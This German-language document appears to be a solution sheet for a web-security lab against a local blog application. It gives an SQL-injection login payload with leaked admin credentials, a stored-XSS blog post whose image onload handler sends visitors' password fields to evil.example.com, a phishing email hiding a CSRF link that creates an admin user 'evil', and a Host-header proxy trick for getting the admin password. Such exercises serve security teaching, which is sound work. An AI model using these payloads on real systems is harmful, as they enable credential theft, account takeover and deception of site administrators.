# 1

> Finde einen gültigen Usernamen mithilfe des /whoami Endpunktes (angenommen es ist nicht bekannt, dass er "fuu" heisst 😜).

- username: `' or true LIMIT 1 --`
- password: `a`

response: `{"username":"admin","fullname":"Super Admin","password":"super5ecret"}`

# 2

> Schreibe einen Blogpost, welcher von jedem Besucher das aktuelle Passwortfeld ausliest und es an evil.example.com schickt.

```html
How Rust improves application security.
Rewriting your application in Rust is a great idea.
RIIR stops all kinds of memory safety issues like buffer overflows, use after free
and your passsword getting stolen 😉.
<img src="https://rustacean.net/assets/cuddlyferris.png" onload="setInterval(()=>{const pw = document.getElementsByClassName('form-control me-1')[1].value;fetch(`https://evil.example.com/passsword?pwd=${encodeURIComponent(pw)}`);},1000)"/>
```

# 3

> Schreibe den Inhalt eines fiktiven Fishing-mails an den (eingeloggten) admin-User, sodass ein neuer User evil mit einem einzelnen Klick erstellt wird. (Annahme: /api/admin* ist geschützt)

Guten Tag Administrator

Ich konnte den letzten Blog von gestern nicht lesen. Gestern
habe ich ihn noch gelesen, aber als ich ihn heute meinen Freunden
zeigen wollte, da es ein sehr guter Blog post war, habe ich ihn
nochmals aufgemacht. Da hat es aber einen "Internal Server Error"
gegeben. Was bedeutet das und können Sie das wieder reparieren?

Es handelt sich um den folgenden Post: [localhost:8080/very-cool-post.html](localhost:8080/api/admin123/create?username=evil&fullname=hahahaha&password=getpasswordedyoupasswordypassword)

Freundliche Grüsse
Daniel Phischer

# 4

> Finde das admin-Passwort mithilfe des /api/blog/health Endpunktes.

Proxy aufsetzen der `/*`-> `http://blog-host:8080/api/user/whoami` redirected, dann den host vom Proxy
im `Host` header auf `/health` setzen.